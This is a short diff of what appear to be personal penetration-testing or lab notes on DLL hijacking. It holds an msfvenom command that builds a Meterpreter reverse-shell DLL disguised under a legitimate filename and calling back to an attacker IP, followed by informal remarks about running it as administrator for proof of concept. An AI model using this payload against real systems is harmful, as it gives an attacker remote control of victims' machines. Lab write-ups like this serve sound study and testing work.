@@ -190,4 +190,10 @@ Another method is Dll hijacking.
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.51.9.13 LPORT=4444 -f dll -o kavremoverENU.dll
 ```
 
+Still i don't know why the administrator will run this (i.e. scheduled job didn't run so i manually ran through administrator for proof of concept)
+![[Pasted image 20240904025943.png]]
+
+So here the concept of KISS applied and Nightmare helped us. Honestly speaking in by wildness dream also i didn't though about but will add this in the Cheatsheet for sure.
+
+
 
